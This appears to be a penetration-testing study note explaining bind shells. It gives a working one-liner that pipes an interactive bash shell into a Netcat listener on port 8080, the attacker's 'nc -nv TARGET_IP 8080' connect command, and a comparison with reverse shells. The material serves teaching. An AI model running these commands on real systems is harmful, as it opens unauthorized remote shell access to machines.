**Bind Shell**

    A bind shell is the opposite of a reverse shell.

    Instead of the target connecting back to the attacker, the target opens a port and waits for the attacker to connect to it.

**How a Bind Shell Works**

    The target runs a shell that is connected to a Netcat listener.

    1. Target Creates the Bind Shell

    Example:
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

    Important is:
    nc -l 0.0.0.0 8080

    This tells Netcat:
    -l -> listen
    0.0.0.0 -> listen on all network interfaces
    8080 -> listen on port 8080

    The target is listening on port 8080 and anyone can connect through it.

    2. Attacker Connects

    The attacker then connects to the target:
    nc -nv TARGET_IP 8080

    nc -> Netcat
    -n -> dont perform DNS lookups
    -v -> verbose output
    TARGET_IP -> target's IP address
    8080 -> bind-shell port

    The connection is:
    Attacker
    │
    │ nc TARGET_IP 8080
    ▼
    Target :8080
    │
    ▼
    Bash Shell

    After the connection succeeds, the attacker can interact with the shell.

**Why Use a Bind Shell?**

    A bind shell can be useful when the target cannot make outbound connections.

    For example:

    Reverse shell:
    Target ───X───> Attacker
        outbound blocked 


    Bind shell:
    Attacker ──────> Target
        inbound connection allowed 

    However, the target must keep a listening port open, which can make the shell easier for security monitoring to discover.![alt text](image.png)